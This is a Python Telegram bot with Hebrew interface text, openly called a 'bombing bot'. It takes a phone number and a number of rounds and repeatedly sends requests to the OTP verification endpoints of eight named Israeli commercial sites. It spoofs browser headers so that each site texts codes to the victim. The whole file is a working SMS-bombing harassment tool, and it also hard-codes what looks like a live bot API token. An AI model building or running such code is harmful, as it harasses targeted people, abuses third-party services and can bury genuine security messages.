import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os
import uuid

# --- הגדרת שרת Flask לשמירה על הבוט ערני ---
app = Flask('')
@app.route('/')
def home(): return "<h1>Bot is Online</h1>"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרת הבוט עם הטוקן שלך ---
API_TOKEN = '8620606926:AAFr649njxp5HJNA7qJqf2I9qFZAzJQVuAY' 
bot = telebot.TeleBot(API_TOKEN)

def attack(m, target, rounds):
    # רשימת ה-API המנצחת: פוקס הום, פוט לוקר, ללין ומשלוחה
    apis = [
        {"n": "Mishloha", "u": "https://www.mishloha.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.mishloha.co.il/"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.foxhome.co.il/"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://footlocker.co.il/"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://www.laline.co.il/"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": str(uuid.uuid4())}, "type": "json", "ref": "https://fox.co.il/"},
        {"n": "Walla", "u": "https://mazaltov.walla.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://mazaltov.walla.co.il/"},
        {"n": "Be Pharm", "u": "https://www.be-pharm.co.il/api/v1/auth/otp", "d": {"phone": target}, "type": "json", "ref": "https://www.be-pharm.co.il/"},
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json", "ref": "https://www.hamal.co.il/"}
    ]
    
    for r in range(int(rounds)):
        success_count = 0
        for site in apis:
            try:
                headers = {
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
                    "Accept": "application/json",
                    "Referer": site["ref"],
                    "Origin": site["ref"].rstrip('/'),
                    "X-Requested-With": "XMLHttpRequest"
                }
                
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=8)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=8)
                
                if res.status_code in [200, 201, 204]:
                    success_count += 1
            except: pass
            time.sleep(0.1)
        
        # הודעת סבב מעוצבת
        status_msg = (
            f"⚡️ **סבב {r+1} הושלם!**\n"
            f"━━━━━━━━━━━━━━\n"
            f"📱 יעד: `{target}`\n"
            f"✅ הצלחות: `{success_count}/{len(apis)}`"
        )
        bot.send_message(m.chat.id, status_msg, parse_mode="Markdown")
        if r < int(rounds) - 1: time.sleep(2)

    bot.send_message(m.chat.id, "🏁 **המשימה הסתיימה בהצלחה!**", parse_mode="Markdown")

# --- פקודת /start שתגיד למשתמש מה לעשות ---
@bot.message_handler(commands=['start'])
def welcome(m):
    welcome_text = (
        "👋 **ברוך הבא לבוט ההפצצות!**\n\n"
        "כדי להתחיל, שלח הודעה בפורמט הבא:\n"
        "💬 `[סבבים] [מספר טלפון]`\n\n"
        "**דוגמה:** `3 0501234567`\n"
        "*(הבוט יפעיל את פוקס, ללין, משלוחה ועוד)*"
    )
    bot.reply_to(m, welcome_text, parse_mode="Markdown")

# --- טיפול בהודעות רגילות ---
@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
            bot.reply_to(m, f"🚀 **מפעיל ספאם על {parts[1]}...**", parse_mode="Markdown")
            attack(m, parts[1], parts[0])
        else:
            bot.reply_to(m, "⚠️ **טעות בפורמט!**\nתקליד: `[סבבים] [מספר טלפון]`", parse_mode="Markdown")
    except: pass

if __name__ == "__main__":
    keep_alive()
    print("Bot is starting...")
    bot.remove_webhook()
    bot.polling(none_stop=True)
